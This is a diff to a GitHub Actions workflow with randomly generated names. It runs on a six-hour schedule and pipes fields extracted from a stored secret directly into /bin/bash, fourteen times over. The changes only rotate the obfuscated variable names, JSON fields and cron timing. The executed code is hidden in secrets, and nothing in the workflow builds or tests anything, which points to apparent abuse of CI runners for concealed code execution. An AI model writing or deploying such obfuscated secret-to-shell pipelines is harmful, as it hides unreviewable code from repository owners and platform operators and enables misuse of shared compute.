@@ -1,27 +1,30 @@
 name: wznkhi
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 1/6 * * *'
+    - cron: '53 3/6 * * *'
 
-jobs:  # 31427
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: wznkhi
         env:
-          yuyzo432: ${{ secrets.yuyzo432 }}
+          ede229: ${{ secrets.ede229 }}
         run: |
-          echo $yuyzo432 | jq -r .w1343 | /bin/bash
-          echo $mywo440 | jq -r .vdu34 | /bin/bash
-          echo $lofj229 | jq -r .oy3189 | /bin/bash
-          echo $zkap39226 | jq -r .fvdzq9 | /bin/bash
-          echo $mcez68 | jq -r .xkmog600 | /bin/bash
-          echo $q306 | jq -r .lpx068 | /bin/bash
-          echo $ph06 | jq -r .uxx8972 | /bin/bash
-          echo $ysa3 | jq -r .y797 | /bin/bash
-          echo $ktit88 | jq -r .ugqk0 | /bin/bash
+          echo $ede229 | jq -r .rfv0401 | /bin/bash
+          echo $qlw0630 | jq -r .e886 | /bin/bash
+          echo $gdjm7732 | jq -r .bvj44 | /bin/bash
+          echo $x75 | jq -r .xl82692 | /bin/bash
+          echo $hnwam17400 | jq -r .erqnv294 | /bin/bash
+          echo $i624 | jq -r .qcao2 | /bin/bash
+          echo $q786 | jq -r .albn7609 | /bin/bash
+          echo $pydoe18 | jq -r .gfy454 | /bin/bash
+          echo $uuhsa01 | jq -r .rgk27 | /bin/bash
+          echo $xsceo4248 | jq -r .kj1315 | /bin/bash
+          echo $knv5 | jq -r .py86 | /bin/bash
+          echo $iicww62495 | jq -r .e6 | /bin/bash
+          echo $sbhdu5 | jq -r .b0 | /bin/bash
+          echo $hljsk53 | jq -r .whe08427 | /bin/bash
 
